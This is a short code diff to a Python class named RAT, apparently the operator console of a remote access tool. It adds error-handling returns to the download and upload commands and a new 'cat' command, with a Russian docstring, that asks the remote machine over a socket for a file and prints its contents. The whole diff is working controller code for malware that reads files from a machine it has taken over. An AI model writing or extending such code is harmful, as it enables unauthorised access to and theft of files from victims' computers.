@@ -76,6 +76,7 @@ class RAT(Cmd):
         file_size = int.from_bytes(self.s.recv(8), 'little')
         if not file_size:
             print('[-] Download error')
+            return
         print('[*] File size:', file_size)
         file = open(filename, 'wb')
         file.write(self.s.recv(file_size, socket.MSG_WAITALL))
@@ -90,6 +91,7 @@ class RAT(Cmd):
         result = self.s.recv(1)[0]
         if not result:
             print('[-] Upload error')
+            return
 
         size = os.path.getsize(filename)
         print('[*] File size:', size)
@@ -122,6 +124,18 @@ class RAT(Cmd):
         print('[+] Done')
 
         self._receive_plaintext()
+
+    def do_cat(self, args):
+        """Вывести содержимое файла"""
+        filename = args.split()[0]
+        self._send_command(Command.DOWNLOAD)
+        self.s.send(bytes([len(filename)]) + filename.encode())
+
+        file_size = int.from_bytes(self.s.recv(8), 'little')
+        if not file_size:
+            print('[-] Download error')
+            return
+        print(self.s.recv(file_size, socket.MSG_WAITALL).decode(), end='')
 
 
 if __name__ == '__main__':
